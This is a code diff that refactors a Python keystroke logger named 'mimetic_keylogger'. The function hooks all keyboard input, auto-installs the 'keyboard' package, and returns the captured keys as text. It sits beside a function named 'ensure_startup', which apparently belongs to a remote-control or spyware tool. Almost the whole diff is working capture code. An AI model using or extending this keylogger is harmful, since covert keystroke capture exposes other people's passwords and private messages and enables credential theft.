@@ -260,9 +260,7 @@ def ensure_startup():
 
 
 def mimetic_keylogger():
-    """Capture all keyboard input in real-time."""
-    global mimetic_active, mimetic_log
-
+    """Capture keyboard input and create a history log."""
     try:
         import keyboard
     except ImportError:
@@ -280,44 +278,45 @@ def mimetic_keylogger():
             return f"Error installing keyboard: {str(e)}"
 
     try:
-        mimetic_log = []
-        mimetic_active = True
+        log = []
+        stop_event = threading.Event()
 
         def on_key_press(event):
-            global mimetic_log
-            if event.name == 'esc' or (event.name == 'c' and keyboard.is_pressed('ctrl')):
-                return False
-
             key_name = event.name
             if key_name == 'space':
-                mimetic_log.append('[SPACE]')
+                log.append('[SPACE]')
             elif key_name == 'enter':
-                mimetic_log.append('[ENTER]\n')
+                log.append('[ENTER]')
             elif key_name == 'tab':
-                mimetic_log.append('[TAB]')
+                log.append('[TAB]')
             elif key_name == 'backspace':
-                mimetic_log.append('[BACKSPACE]')
+                log.append('[BACKSPACE]')
+            elif key_name == 'delete':
+                log.append('[DELETE]')
+            elif key_name == 'shift':
+                log.append('[SHIFT]')
+            elif key_name == 'ctrl':
+                log.append('[CTRL]')
+            elif key_name == 'alt':
+                log.append('[ALT]')
             elif len(key_name) == 1:
-                mimetic_log.append(key_name)
+                log.append(key_name)
             else:
-                mimetic_log.append(f'[{key_name.upper()}]')
+                log.append(f'[{key_name.upper()}]')
 
-            return True
+            if key_name == 'esc' or (event.name == 'c' and keyboard.is_pressed('ctrl')):
+                stop_event.set()
+                return False
 
         keyboard.on_press(on_key_press)
 
-        while mimetic_active:
-            time.sleep(0.1)
-            if keyboard.is_pressed('ctrl+c'):
-                break
-
+        # Wait for Ctrl+C or ESC
+        stop_event.wait()
         keyboard.unhook_all()
-        mimetic_active = False
-        result = ''.join(mimetic_log)
-        mimetic_log = []
-        return result
+
+        result = ''.join(log)
+        return result if result else "No keys recorded"
     except Exception as e:
-        mimetic_active = False
         return f"Error: {str(e)}"
 
 
